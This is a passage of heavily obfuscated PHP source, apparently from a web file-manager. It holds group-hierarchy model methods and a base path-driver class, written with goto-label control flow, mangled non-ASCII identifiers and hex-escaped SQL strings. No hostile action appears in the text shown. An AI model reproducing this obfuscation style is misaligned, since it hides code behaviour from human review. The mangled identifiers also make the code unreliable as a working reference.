"\x53\x45\114\x45\x43\124\x20\52\x20\106\x52\117\x4d\x20\50\123\x45\x4c\x45\x43\124\x20\x27{$BõÚÒ¤¥}\137\143\x68\151\154\x64\x27\40\141\x73\40\150\141\163\40\106\x52\117\115\40\x60{$DÊÁ…–ÇÃ¥}\140\40\x77\150\x65\x72\145\40\160\141\x72\x65\156\164\111\x44\75{$BõÚÒ¤¥}\40\x6c\x69\155\x69\164\x20\61\51\x20\x61\163\40\164\x62\137{$BõÚÒ¤¥}\x20\x75\x6e\x69\x6f\156\x20\x61\x6c\x6c\40"; if (($fµæÊì‚Æ >= 20 || $d”œ¹¡„† == $dŠÚøõÖ‰ø - 1) && $cá¯Ğ‰Öñì) { $cá¯Ğ‰Öñì = substr($cá¯Ğ‰Öñì, 0, -strlen($C¦ÜšÉ‚Ş[458])); $BÈÆàÊ½Á = $this->query($cá¯Ğ‰Öñì); $E³Ì´…Ğ‘ = array_merge($E³Ì´…Ğ‘, $BÈÆàÊ½Á); $fµæÊì‚Æ = 0; $cá¯Ğ‰Öñì = $C¦ÜšÉ‚Ş[33]; } } goto e¤ÀÊ™´¼½; bÓ„•–‹˜÷: } private function _listAppendChildrenMember(&$A×Ç±”˜ìÁ) { goto EË½”Ï…¯; EË½”Ï…¯: $c„ÓæËŠ•† =& $_SERVER[í…¶]; $dìÔÀËî¬± = $c„ÓæËŠ•†[370]; $a™­Ù÷ßä‰ = array(); goto BÈó×•Ì±ß; eÎ„×¢ª†£: $a™­Ù÷ßä‰ = array_to_keyvalue($a™­Ù÷ßä‰, $c„ÓæËŠ•†[459]); foreach ($A×Ç±”˜ìÁ as &$Añù†Ş½) { $Añù†Ş½[$c„ÓæËŠ•†[2187]] = isset($a™­Ù÷ßä‰[$Añù†Ş½[$c„ÓæËŠ•†[2101]] . $c„ÓæËŠ•†[2186]]); } goto bçÇïµøƒ¬; BÈó×•Ì±ß: $c¬šŠ’ë§§ = count($A×Ç±”˜ìÁ); $E³Ö•¸Á¢ = $this->tablePrefix . $c„ÓæËŠ•†[2177]; for ($D¸çÑ¾½ÛÆ = 0, $d¬ï‹ÈÆÀ = 0; $D¸çÑ¾½ÛÆ < $c¬šŠ’ë§§; $D¸çÑ¾½ÛÆ++) { $d¬ï‹ÈÆÀ++; $f·Œ¸˜‘µ˜ = $A×Ç±”˜ìÁ[$D¸çÑ¾½ÛÆ][$c„ÓæËŠ•†[2101]]; $dìÔÀËî¬± .= "\x53\105\x4c\x45\x43\124\x20\x2a\x20\106\x52\x4f\x4d\x20\x28\123\x45\x4c\x45\103\124\x20\x27{$f·Œ¸˜‘µ˜}\x5f\x63\x68\x69\x6c\144\47\40\141\163\40\x68\141\163\40\106\122\117\x4d\40\x60{$E³Ö•¸Á¢}\140\40\x77\150\145\x72\x65\x20\x67\162\157\x75\x70\111\104\75{$f·Œ¸˜‘µ˜}\40\x6c\x69\155\151\x74\40\61\x29\40\141\x73\x20\164\x62\x5f{$f·Œ¸˜‘µ˜}\x20\x75\x6e\x69\157\x6e\40\141\154\x6c\x20"; if (($d¬ï‹ÈÆÀ >= 20 || $D¸çÑ¾½ÛÆ == $c¬šŠ’ë§§ - 1) && $dìÔÀËî¬±) { $dìÔÀËî¬± = substr($dìÔÀËî¬±, 0, -strlen($c„ÓæËŠ•†[458])); $FÇ´Æ–ã = $this->query($dìÔÀËî¬±); $a™­Ù÷ßä‰ = array_merge($a™­Ù÷ßä‰, $FÇ´Æ–ã); $d¬ï‹ÈÆÀ = 0; $dìÔÀËî¬± = $c„ÓæËŠ•†[33]; } } goto eÎ„×¢ª†£; bçÇïµøƒ¬: } private function _listAppendMeta(&$E¥é¢îå, $Eß¥¾îˆïØ) { $c™“ì¸Íñ =& $_SERVER[í…¶]; $C˜Ù³ëÔ Ê = array($c™“ì¸Íñ[2101] => array($c™“ì¸Íñ[7], $Eß¥¾îˆïØ)); $fïÚÓê‡ŠÈ = Model($c™“ì¸Íñ[2176])->where($C˜Ù³ëÔ Ê)->select(); $fïÚÓê‡ŠÈ = array_to_keyvalue_group($fïÚÓê‡ŠÈ, $c™“ì¸Íñ[2101]); foreach ($fïÚÓê‡ŠÈ as &$D±ÚäğŠ¡³) { $D±ÚäğŠ¡³ = array_to_keyvalue($D±ÚäğŠ¡³, $c™“ì¸Íñ[89], $c™“ì¸Íñ[368]); } foreach ($E¥é¢îå as &$B°Ù‹ŠçˆÁ) { $B°Ù‹ŠçˆÁ[$c™“ì¸Íñ[426]] = array(); if (isset($fïÚÓê‡ŠÈ[$B°Ù‹ŠçˆÁ[$c™“ì¸Íñ[2101]]])) { $B°Ù‹ŠçˆÁ[$c™“ì¸Íñ[426]] = $fïÚÓê‡ŠÈ[$B°Ù‹ŠçˆÁ[$c™“ì¸Íñ[2101]]]; } } } protected function parentLevelArray($EÆÜ–ŠÇ³Æ) { $F¿†—Ü‘¬² =& $_SERVER[í…¶]; $EÆÜ–ŠÇ³Æ = explode($F¿†—Ü‘¬²[47], trim($EÆÜ–ŠÇ³Æ, $F¿†—Ü‘¬²[47])); $EÆÜ–ŠÇ³Æ = array_remove_value($EÆÜ–ŠÇ³Æ, $F¿†—Ü‘¬²[477]); return $EÆÜ–ŠÇ³Æ; } private function _listAppendParent(&$eììÀ¦‡ê) { goto BëèÎ¯òÌ™; dç¢‘¯¯Ğõ: $bŠ¡Ú£ˆ¯â = array(); foreach ($AÉÑêŒĞ®‘ as $eÅ…åæ‡°Ñ => $b¬â¸öÀóì) { if (!$b¬â¸öÀóì) { $bŠ¡Ú£ˆ¯â[] = $eÅ…åæ‡°Ñ; } } if ($bŠ¡Ú£ˆ¯â) { $F¢Çà‡¥‘Á = array($Aî£¤ŒŸÊ»[2175] => array($Aî£¤ŒŸÊ»[393], $bŠ¡Ú£ˆ¯â)); $F¦­•Ä·ø÷ = $this->field($Aî£¤ŒŸÊ»[2188])->where($F¢Çà‡¥‘Á)->select(); $A–íÅ ğÉŠ = array_to_keyvalue($F¦­•Ä·ø÷, $Aî£¤ŒŸÊ»[2101], $Aî£¤ŒŸÊ»[28]); $AÉÑêŒĞ®‘ = array_merge_index($AÉÑêŒĞ®‘, $A–íÅ ğÉŠ); } goto Cé¯øˆ¼¼; Cé¯øˆ¼¼: $e…ËĞãšòÁ = $GLOBALS[$Aî£¤ŒŸÊ»[6]][$Aî£¤ŒŸÊ»[84]][$Aî£¤ŒŸÊ»[2189]]; foreach ($eììÀ¦‡ê as &$Aìö¯İÍ¼Ÿ) { $E±†’×í£ = $this->parentLevelArray($Aìö¯İÍ¼Ÿ[$Aî£¤ŒŸÊ»[468]]); $d«ãğÃÇÅä = $Aî£¤ŒŸÊ»[33]; foreach ($E±†’×í£ as $eÅ…åæ‡°Ñ => $AŠ¥–íŸÌĞ) { if ($e…ËĞãšòÁ && $eÅ…åæ‡°Ñ == 0) { continue; } $d«ãğÃÇÅä .= $AÉÑêŒĞ®‘[$AŠ¥–íŸÌĞ] . $Aî£¤ŒŸÊ»[8]; } if ($E±†’×í£) { $d«ãğÃÇÅä .= $Aìö¯İÍ¼Ÿ[$Aî£¤ŒŸÊ»[28]]; } $Aìö¯İÍ¼Ÿ[$Aî£¤ŒŸÊ»[472]] = str_replace($Aî£¤ŒŸÊ»[476], $Aî£¤ŒŸÊ»[8], $d«ãğÃÇÅä); } goto BÅº·¼Ï’¶; BëèÎ¯òÌ™: $Aî£¤ŒŸÊ» =& $_SERVER[í…¶]; $AÉÑêŒĞ®‘ = array(); foreach ($eììÀ¦‡ê as &$Aìö¯İÍ¼Ÿ) { $AÉÑêŒĞ®‘[$Aìö¯İÍ¼Ÿ[$Aî£¤ŒŸÊ»[2101]]] = $Aìö¯İÍ¼Ÿ[$Aî£¤ŒŸÊ»[28]]; $E±†’×í£ = $this->parentLevelArray($Aìö¯İÍ¼Ÿ[$Aî£¤ŒŸÊ»[468]]); foreach ($E±†’×í£ as $AŠ¥–íŸÌĞ) { if (!isset($AÉÑêŒĞ®‘[$AŠ¥–íŸÌĞ])) { $AÉÑêŒĞ®‘[$AŠ¥–íŸÌĞ] = 0; } } } goto dç¢‘¯¯Ğõ; BÅº·¼Ï’¶: } private function _listAppendSourceRoot(&$E†ÈÇÄã¿°, $Bğ¡ìÑ‰¾Ê) { goto d”ñ‰†ííõ; d”ñ‰†ííõ: $fç—²ñÚÑß =& $_SERVER[í…¶]; $b™éŞ—ÚÛ = array($fç—²ñÚÑß[380] => SourceModel::TYPE_GROUP, $fç—²ñÚÑß[470] => 0, $fç—²ñÚÑß[465] => array($fç—²ñÚÑß[7], $Bğ¡ìÑ‰¾Ê)); $E–ù¬£¬ = $fç—²ñÚÑß[2190]; goto aí¥…ÜÁ‹³; d™Ğ²‡ÒÏ«: foreach ($E†ÈÇÄã¿° as &$F‹Ì„ØºÅ) { $F‹Ì„ØºÅ[$fç—²ñÚÑß[400]] = $B‹Òñ ìÎ„[$F‹Ì„ØºÅ[$fç—²ñÚÑß[2101]]] ? $B‹Òñ ìÎ„[$F‹Ì„ØºÅ[$fç—²ñÚÑß[2101]]] : array(); } goto DÕ‚´ø§ÆÓ; aí¥…ÜÁ‹³: $B‹Òñ ìÎ„ = Model($fç—²ñÚÑß[755])->order($fç—²ñÚÑß[2191])->field($E–ù¬£¬)->where($b™éŞ—ÚÛ)->select(); $B‹Òñ ìÎ„ = array_to_keyvalue($B‹Òñ ìÎ„, $fç—²ñÚÑß[465]); $B‹Òñ ìÎ„ = array_remove_key($B‹Òñ ìÎ„, $fç—²ñÚÑß[465]); goto d™Ğ²‡ÒÏ«; DÕ‚´ø§ÆÓ: } protected function groupMerge($f¬×ƒ«×‹ ) { $f¬×ƒ«×‹  = array_unique($f¬×ƒ«×‹ ); $CÉ‹½ª‡Öİ = array(); for ($EÇƒİ¿¦·˜ = 0; $EÇƒİ¿¦·˜ < count($f¬×ƒ«×‹ ); $EÇƒİ¿¦·˜++) { $c’Ó±¶ÇĞ¹ = !1; for ($a¸†®‹¼éµ = 0; $a¸†®‹¼éµ < count($f¬×ƒ«×‹ ); $a¸†®‹¼éµ++) { if ($EÇƒİ¿¦·˜ == $a¸†®‹¼éµ) { continue; } if ($this->isParentOf($f¬×ƒ«×‹ [$a¸†®‹¼éµ], $f¬×ƒ«×‹ [$EÇƒİ¿¦·˜])) { $c’Ó±¶ÇĞ¹ = !0; break; } } if (!$c’Ó±¶ÇĞ¹) { $CÉ‹½ª‡Öİ[] = $f¬×ƒ«×‹ [$EÇƒİ¿¦·˜]; } } return $CÉ‹½ª‡Öİ; } protected function isParentOf($DÎõ¸Œ¬Âİ, $bñÈ¦Î‘°¡) { goto F×ªÍÅ²ç; cÙÉ°£: return !1; goto eôÏŸ„Ş´‹; AÔ¶°†¹”Ä: $B‰Š¡º‘¾¢ = $this->getInfoSimple($bñÈ¦Î‘°¡); $b–íİâÛ = $fÄ¹èá¯¦™[$D¥¢ Á…áÑ[468]] . $DÎõ¸Œ¬Âİ . $D¥¢ Á…áÑ[47]; if (substr($B‰Š¡º‘¾¢[$D¥¢ Á…áÑ[468]], 0, strlen($b–íİâÛ)) == $b–íİâÛ) { return !0; } goto cÙÉ°£; F×ªÍÅ²ç: $D¥¢ Á…áÑ =& $_SERVER[í…¶]; if (!$DÎõ¸Œ¬Âİ || !$bñÈ¦Î‘°¡ || $DÎõ¸Œ¬Âİ == $bñÈ¦Î‘°¡) { return !1; } $fÄ¹èá¯¦™ = $this->getInfoSimple($DÎõ¸Œ¬Âİ); goto AÔ¶°†¹”Ä; eôÏŸ„Ş´‹: } public function groupShowRoot($b¤ê‘¤ì, $aÂ­‰êË–Ö = false) { goto fĞ™ê¼¿•å; fĞ™ê¼¿•å: $AØÆ±‘ª° =& $_SERVER[í…¶]; $c…Ç’±¬ = $this->getInfo($b¤ê‘¤ì); $E¯½õğÏªñ = $this->parentLevelArray($c…Ç’±¬[$AØÆ±‘ª°[468]]); goto f­Ëš¼Ò¾; f­Ëš¼Ò¾: $fñöÏ±¯‰ = array($b¤ê‘¤ì); if (count($E¯½õğÏªñ) == 0) { return $fñöÏ±¯‰; } if ($aÂ­‰êË–Ö && count($E¯½õğÏªñ) == 1) { return $fñöÏ±¯‰; } goto e³×•ß¦¨ê; e³×•ß¦¨ê: if (!$c…Ç’±¬[$AØÆ±‘ª°[426]] || !isset($c…Ç’±¬[$AØÆ±‘ª°[426]][$AØÆ±‘ª°[2173]]) || $c…Ç’±¬[$AØÆ±‘ª°[426]][$AØÆ±‘ª°[2173]] == $AØÆ±‘ª°[2150]) { return $this->groupShowRoot($E¯½õğÏªñ[count($E¯½õğÏªñ) - 1], $aÂ­‰êË–Ö); } if ($c…Ç’±¬[$AØÆ±‘ª°[426]][$AØÆ±‘ª°[2173]] == $AØÆ±‘ª°[355]) { $EİŠ¿È•ÏŞ = explode($AØÆ±‘ª°[47], $c…Ç’±¬[$AØÆ±‘ª°[426]][$AØÆ±‘ª°[2174]]); if ($EİŠ¿È•ÏŞ) { $fñöÏ±¯‰ = array_merge($fñöÏ±¯‰, $EİŠ¿È•ÏŞ); } } return $fñöÏ±¯‰; goto fğãì•Ï; fğãì•Ï: } protected function resetParentLevel() { $Fš¹èƒ°ñÃ =& $_SERVER[í…¶]; $Dß”îĞ†Âå = $Fš¹èƒ°ñÃ[2101]; $cºßóîÒ¼© = $this->select(); $cºßóîÒ¼© = array_to_keyvalue($cºßóîÒ¼©, $Dß”îĞ†Âå); foreach ($cºßóîÒ¼© as $fÀŠ‹°Ä¼í) { goto b·Ê¡‚‘ÏÄ; A¥Ç¿ßÂ÷: $CˆŠµË®´[] = 0; $CˆŠµË®´ = $Fš¹èƒ°ñÃ[47] . implode($Fš¹èƒ°ñÃ[47], array_reverse($CˆŠµË®´)) . $Fš¹èƒ°ñÃ[47]; $this->setNamePinyin($fÀŠ‹°Ä¼í[$Dß”îĞ†Âå], $fÀŠ‹°Ä¼í[$Fš¹èƒ°ñÃ[28]]); goto dŒá–ä‡íŞ; dŒá–ä‡íŞ: $this->where(array($Dß”îĞ†Âå => $fÀŠ‹°Ä¼í[$Dß”îĞ†Âå]))->save(array($Fš¹èƒ°ñÃ[534] => $CˆŠµË®´)); goto Fˆ¬îªß¸Ó; b·Ê¡‚‘ÏÄ: $a¯ºŸ æ‡ = $fÀŠ‹°Ä¼í; $CˆŠµË®´ = array(); while ($a¯ºŸ æ‡[$Fš¹èƒ°ñÃ[470]] != 0) { $CˆŠµË®´[] = $a¯ºŸ æ‡[$Fš¹èƒ°ñÃ[470]]; $a¯ºŸ æ‡ = $cºßóîÒ¼©[$a¯ºŸ æ‡[$Fš¹èƒ°ñÃ[470]]]; } goto A¥Ç¿ßÂ÷; Fˆ¬îªß¸Ó: } return $cºßóîÒ¼©; } public function groupNameAuto($aÔ¾Œë¹¯ƒ, $f›óÚ±¦í£) { $F½Åîã­Œˆ =& $_SERVER[í…¶]; $fŒİöåá– = $this->where(array($F½Åîã­Œˆ[377] => $aÔ¾Œë¹¯ƒ))->getField($F½Åîã­Œˆ[28], !0); if (!$fŒİöåá– || !in_array($f›óÚ±¦í£, $fŒİöåá–)) { return $f›óÚ±¦í£; } for ($fŒĞì§¶ = 1; $fŒĞì§¶ <= count($fŒİöåá–) + 1; $fŒĞì§¶++) { $d½¢¬‘ÔÖ” = $f›óÚ±¦í£ . "\50{$fŒĞì§¶}\x29"; if (!in_array($d½¢¬‘ÔÖ”, $fŒİöåá–)) { return $d½¢¬‘ÔÖ”; } } } } goto bÃ»¥¸¡«ï; d‰Öà´¦î‘: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $FÅƒ¯ä—ò =& $_SERVER[í…¶]; $this->objectDriver = array($FÅƒ¯ä—ò[57], $FÅƒ¯ä—ò[58], $FÅƒ¯ä—ò[59], $FÅƒ¯ä—ò[60], $FÅƒ¯ä—ò[61], $FÅƒ¯ä—ò[62], $FÅƒ¯ä—ò[63], $FÅƒ¯ä—ò[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C¾¾’ƒ¦) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C¾¾’ƒ¦, $_SERVER[í…¶][8]); } return $C¾¾’ƒ¦; } public function getPathName($e†ÉçõÉ) { return $e†ÉçõÉ; } public function iconvApp($A‘ù­‚ã±») { return $A‘ù­‚ã±»; } public function iconvSystem($fƒ­÷ì§íŞ) { return $fƒ­÷ì§íŞ; } public function iconvTo($CæÔÕ÷ãš÷, $FÇï†çˆ™, $cÎ ïßÒŸ×) { goto Eç–„š‰ñ¡; E¢ğ‡‹ÎÉ©: $dà‰›ÕÍÍ¯[$cÎ ïßÒŸ× . $aÓ¿ñ¶Šˆ»[66] . $FÇï†çˆ™ . $aÓ¿ñ¶Šˆ»[67] . $CæÔÕ÷ãš÷] = $CæÔÕ÷ãš÷; $dà‰›ÕÍÍ¯[$cÎ ïßÒŸ× . $aÓ¿ñ¶Šˆ»[66] . $FÇï†çˆ™ . $aÓ¿ñ¶Šˆ»[67] . $eÃò‰‹¡âÎ] = $CæÔÕ÷ãš÷; $dà‰›ÕÍÍ¯[$FÇï†çˆ™ . $aÓ¿ñ¶Šˆ»[66] . $cÎ ïßÒŸ× . $aÓ¿ñ¶Šˆ»[67] . $eÃò‰‹¡âÎ] = $eÃò‰‹¡âÎ; goto e‰éï¹Á¼æ; AÊã°ìİ«ƒ: $eÃò‰‹¡âÎ = $eÃò‰‹¡âÎ ? $eÃò‰‹¡âÎ : $CæÔÕ÷ãš÷; if (strstr($eÃò‰‹¡âÎ, $aÓ¿ñ¶Šˆ»[69])) { $eÃò‰‹¡âÎ = str_replace($aÓ¿ñ¶Šˆ»[69], $aÓ¿ñ¶Šˆ»[70], $eÃò‰‹¡âÎ); } $dà‰›ÕÍÍ¯[$FÇï†çˆ™ . $aÓ¿ñ¶Šˆ»[66] . $cÎ ïßÒŸ× . $aÓ¿ñ¶Šˆ»[67] . $CæÔÕ÷ãš÷] = $eÃò‰‹¡âÎ; goto E¢ğ‡‹ÎÉ©; dÍË¬È„´¶: $DŠÈ Î¸İ‘ = $FÇï†çˆ™ . $aÓ¿ñ¶Šˆ»[66] . $cÎ ïßÒŸ× . $aÓ¿ñ¶Šˆ»[67] . $CæÔÕ÷ãš÷; if (isset($dà‰›ÕÍÍ¯[$DŠÈ Î¸İ‘])) { return $dà‰›ÕÍÍ¯[$DŠÈ Î¸İ‘]; } if (function_exists($aÓ¿ñ¶Šˆ»[68])) { $eÃò‰‹¡âÎ = @mb_convert_encoding($CæÔÕ÷ãš÷, $cÎ ïßÒŸ×, $FÇï†çˆ™); } else { $eÃò‰‹¡âÎ = @iconv($FÇï†çˆ™, $cÎ ïßÒŸ×, $CæÔÕ÷ãš÷); } goto AÊã°ìİ«ƒ; Eç–„š‰ñ¡: $aÓ¿ñ¶Šˆ» =& $_SERVER[í…¶]; if (!$CæÔÕ÷ãš÷ || !function_exists($aÓ¿ñ¶Šˆ»[65])) { return $CæÔÕ÷ãš÷; } static $dà‰›ÕÍÍ¯ = array(); goto dÍË¬È„´¶; e‰éï¹Á¼æ: return $eÃò‰‹¡âÎ; goto AÌ ©¡ÙÈ…; AÌ ©¡ÙÈ…: } public function getPathInner($fö¸ ‘è…ù) { $FŸ®Ì‚Ê¯ = IO::init($fö¸ ‘è…ù); return $FŸ®Ì‚Ê¯->path; } public function getPathOuter($a™—¶íŸ‰») { $bª¿îµã³Ğ =& $_SERVER[í…¶]; $cƒ¹Ã‹…Ü = strlen(trim($this->pathBase, $bª¿îµã³Ğ[8])); $a™—¶íŸ‰» = substr(trim($a™—¶íŸ‰», $bª¿îµã³Ğ[8]), $cƒ¹Ã‹…Ü); return $this->pathDriver . $bª¿îµã³Ğ[8] . ltrim($a™—¶íŸ‰», $bª¿îµã³Ğ[8]); } public function isParentOf($Dï…ôáá²‡, $C‡¾İõÙ´¾) { $f¾æ¦Ûµ‘£ =& $_SERVER[í…¶]; $Dï…ôáá²‡ = rtrim(strtolower($Dï…ôáá²‡), $f¾æ¦Ûµ‘£[8]) . $f¾æ¦Ûµ‘£[8]; $C‡¾İõÙ´¾ = rtrim(strtolower($C‡¾İõÙ´¾), $f¾æ¦Ûµ‘£[8]) . $f¾æ¦Ûµ‘£[8]; $dÖ»ß…ïÑØ = strpos($C‡¾İõÙ´¾, $Dï…ôáá²‡) === 0; return $dÖ»ß…ïÑØ; } public function getType() { $d¹à‚ÆÉ· =& $_SERVER[í…¶]; $DåÂ¤ªµš = str_replace($d¹à‚ÆÉ·[71], $d¹à‚ÆÉ·[33], get_class($this)); return strtolower($DåÂ¤ªµš); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($cÛ°·‹É», $Döå§óÉ) { $dœ©‘ó‹¯ô =& $_SERVER[í…¶]; $eÛ§‰µŠŠ = rtrim($cÛ°·‹É», $dœ©‘ó‹¯ô[8]) . $dœ©‘ó‹¯ô[8] . $Döå§óÉ; $Aí¶ÅÛÖªÙ = $this->exist($eÛ§‰µŠŠ); return $Aí¶ÅÛÖªÙ ? $eÛ§‰µŠŠ : !1; } public function setModifyTime($f³ºÁ†Øİ·, $E±Å²¾Í‚± = '') { } public function renameObject($F‹õì¤’Î, $Bœ¸ø©Õäï) { goto fÔÇë«œŠ÷; D¤Ÿå¹‚ß: return $Eªí‹µ« ? $Bœ¸ø©Õäï : !1; goto D¡Óš¹¯ê¿; f“·©½Ö–˜: $F‹õì¤’Î = $this->getPathOuter($F‹õì¤’Î); $Bœ¸ø©Õäï = $this->pathFather($F‹õì¤’Î) . $Bœ¸ø©Õäï; if (IO::isFile($F‹õì¤’Î)) { $Eªí‹µ« = IO::copy($F‹õì¤’Î, $this->pathFather($F‹õì¤’Î), REPEAT_RENAME_FOLDER, $dµÒ³•¹ÌÀ); if ($Eªí‹µ«) { IO::remove($F‹õì¤’Î); } } else { $Eªí‹µ« = IO::mkdir($Bœ¸ø©Õäï); if (!$Eªí‹µ«) { return !1; } $fâÆÔ¬±ãÔ = IO::listPath($F‹õì¤’Î, !0); $FÜÉ’Èè¸  = array_merge($fâÆÔ¬±ãÔ[$B³ÌãÔÄ’Œ[73]], $fâÆÔ¬±ãÔ[$B³ÌãÔÄ’Œ[74]]); foreach ($FÜÉ’Èè¸  as $c„šäĞ…î¹) { IO::move($c„šäĞ…î¹[$B³ÌãÔÄ’Œ[75]], $Bœ¸ø©Õäï, REPEAT_RENAME_FOLDER); } IO::remove($F‹õì¤’Î); } goto D¤Ÿå¹‚ß; fÔÇë«œŠ÷: $B³ÌãÔÄ’Œ =& $_SERVER[í…¶]; $dµÒ³•¹ÌÀ = $Bœ¸ø©Õäï; Hook::trigger($B³ÌãÔÄ’Œ[72], $this, $F‹õì¤’Î, $this, $this->pathFather($F‹õì¤’Î) . $Bœ¸ø©Õäï); goto f“·©½Ö–˜; D¡Óš¹¯ê¿: } public function tempFile($CŒ»Ÿ‡¦•© = '', $d“…‰ùÀ‰ = '') { goto d­‡ñÈ‹ç—; E­›ã‡Ğ•¿: return $fŠæ¸¥Ğ•; goto Dô¬ÄÃõô; dÕ¨³îÔà—: $fŠæ¸¥Ğ• = $cÂÎí£ˆÄ . $CŒ»Ÿ‡¦•©; @touch($fŠæ¸¥Ğ•); if ($d“…‰ùÀ‰) { file_put_contents($fŠæ¸¥Ğ•, $d“…‰ùÀ‰); } goto E­›ã‡Ğ•¿; d­‡ñÈ‹ç—: if (!$CŒ»Ÿ‡¦•©) { $CŒ»Ÿ‡¦•© = rand_string(15); } $cÂÎí£ˆÄ = TEMP_FILES . rand_string(15) . $_SERVER[í…¶][8]; @mkdir($cÂÎí£ˆÄ, 511, !0); goto dÕ¨³îÔà—; Dô¬ÄÃõô: } public function tempFileRemve($FÁª‘šÔ¹•) { @unlink($FÁª‘šÔ¹•); @rmdir($this->pathFather($FÁª‘šÔ¹•)); } public function mkfile($DÇ½ÜÍß‘è, $cÇùÜ¨™Ô = '', $F»ò„²»Ğ = REPEAT_RENAME) { } public function mkdir($EÔ¡¿Š«º, $AßÑ®¦ ©Ü = REPEAT_SKIP) { } public function delFile($B×ãæ—ô‹) { } public function delFolder($C¿‹–´Î¶) { } public function copyFile($FÅöÍÑ©Ç³, $aÈğ°…Š¢) { } public function moveFile($e½·çî–, $b¤Ğİâ‰Œ) { } public function remove($d‚ŸíÓ‘Ã) { if ($this->isFile($d‚ŸíÓ‘Ã)) { return $this->delFile($d‚ŸíÓ‘Ã); } return $this->delFolder($d‚ŸíÓ‘Ã); } public function rename($e…ÛäİŞÑé, $b—Ó…íŸ„) { } public function exist($A¿“˜ßèÊ±) { } public function findByHash($F‰ÔÒ‡¬°¦ = '', $D“Áš¨íù“ = '') { return !1; } public function isFile($a„Íê†ô¤) { } public function isFolder($c„¶¿˜„Â°) { } public function size($Fİéğƒ†¯‘) { } public function info($C……æ Ãô) { } public function infoSimple($bŒíñ‡ö·Û) { return $this->info($bŒíñ‡ö·Û); } public function infoAuth($Fœø½†¬ª) { return $this->info($Fœø½†¬ª); } public function infoFull($Cá†ˆŒ÷áí) { return $this->info($Cá†ˆŒ÷áí); } public function infoWithChildren($b¨À…†ÎŒÒ) { $câš‹¨ÕáĞ =& $_SERVER[í…¶]; static $F÷­›ëÕëó = array(); if (isset($F÷­›ëÕëó[$b¨À…†ÎŒÒ])) { return $F÷­›ëÕëó[$b¨À…†ÎŒÒ]; } $E÷Ä‚æÙ = $this->info($b¨À…†ÎŒÒ); if ($E÷Ä‚æÙ && $E÷Ä‚æÙ[$câš‹¨ÕáĞ[29]] == $câš‹¨ÕáĞ[76]) { $cåÁ‘¹Û±µ = array($câš‹¨ÕáĞ[77] => 0, $câš‹¨ÕáĞ[78] => 0, $câš‹¨ÕáĞ[79] => 0); $this->infoChildren($b¨À…†ÎŒÒ, $cåÁ‘¹Û±µ); $E÷Ä‚æÙ[$câš‹¨ÕáĞ[77]] = $cåÁ‘¹Û±µ[$câš‹¨ÕáĞ[77]]; $E÷Ä‚æÙ[$câš‹¨ÕáĞ[80]] = array($câš‹¨ÕáĞ[81] => $cåÁ‘¹Û±µ[$câš‹¨ÕáĞ[78]], $câš‹¨ÕáĞ[82] => $cåÁ‘¹Û±µ[$câš‹¨ÕáĞ[79]]); $F÷­›ëÕëó[$b¨À…†ÎŒÒ] = $E÷Ä‚æÙ; } return $E÷Ä‚æÙ; } public function listPath($D¤ö‰šæ“ˆ, $báËÜïãí¥ = false) { } public function has($Aâ¸„®„ë, $E—™’æ¿Å‡ = false, $aÖ¥Óññ¤‚ = false) { } public function canRead($E´–ÑÌÇ§Û) { } public function canWrite($AÇ³‘Î‡Ì¤) { } public function getContent($AÊ¾ã„…ˆ) { } public function setContent($aåÓ˜ö«¢¼, $FÓ‹ÒÎ´ = '') { } protected function infoChildren($e«Òòã·¸, &$e¬ßÎØ¯¼Ä) { $B½¡äÈ˜ëØ =& $_SERVER[í…¶]; check_abort(); $CÔ—’“İ‘‰ = $this->listPath($e«Òòã·¸, !0); $CÔ—’“İ‘‰ = array_merge($CÔ—’“İ‘‰[$B½¡äÈ˜ëØ[74]], $CÔ—’“İ‘‰[$B½¡äÈ˜ëØ[73]]); foreach ($CÔ—’“İ‘‰ as $D†óª‰›Å) { if ($D†óª‰›Å[$B½¡äÈ˜ëØ[29]] == $B½¡äÈ˜ëØ[76]) { $e¬ßÎØ¯¼Ä[$B½¡äÈ˜ëØ[79]]++; $A÷ª²ËİãÚ = $this->getPathInner($D†óª‰›Å[$B½¡äÈ˜ëØ[75]]); $this->infoChildren($A÷ª²ËİãÚ, $e¬ßÎØ¯¼Ä); } else { $e¬ßÎØ¯¼Ä[$B½¡äÈ˜ëØ[78]]++; $e¬ßÎØ¯¼Ä[$B½¡äÈ˜ëØ[77]] += $D†óª‰›Å[$B½¡äÈ˜ëØ[77]]; } } } public function fileSubstr($DÓˆ–ƒÛ¾Ï, $døìŠãÜ‰Í, $f¡ÀÂğŞÛ½) { } public function listAll($aÁå±Ü‰ƒ) { } public function upload($A†°…±ŠÕµ, $Cáğ–æÌö¶, $eäŒÊùÀ«Ø = false, $Dëáà†ØóÀ = REPEAT_REPLACE) { } public function uploadFileByID($c ˜†Ü´»ã, $c®ñ’ìª, $D’§»Ñ¡­‘) { } public function uploadFileByPath($bÖä®á†îá, $eÔ™ŸÓÙ–Ö, $CÅİ¿µ›À¹ = array()) { } public function isUploadServer() { $AŠîÖ’•«“ =& $_SERVER[í…¶]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $AŠîÖ’•«“[83]) { return !0; } return $GLOBALS[$AŠîÖ’•«“[6]][$AŠîÖ’•«“[84]][$AŠîÖ’•«“[85]]; } public function isFileOutServer() { $Bù©…õ˜±´ =& $_SERVER[í…¶]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Bù©…õ˜±´[83]) { return !0; } return $GLOBALS[$Bù©…õ˜±´[6]][$Bù©…õ˜±´[84]][$Bù©…õ˜±´[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($F½¥®›“ğ÷) { $f‹îØÒ´÷ó =& $_SERVER[í…¶]; if (!$this->isCdnHost()) { return $F½¥®›“ğ÷; } return str_replace(trim(get_url_root($F½¥®›“ğ÷), $f‹îØÒ´÷ó[8]), trim($this->cdnHost, $f‹îØÒ´÷ó[8]), $F½¥®›“ğ÷); } public function uploadLink($eŞå¢í®Ëğ, $fÌÈêö¶·Ş = 0) { goto aÒ–¥êìíç; D¥âï¶‰ÑÅ: if ($eèÂ±‘èÄ½) { $eèÂ±‘èÄ½[$cíµ†áÊáÈ[89]] = $eŞå¢í®Ëğ; 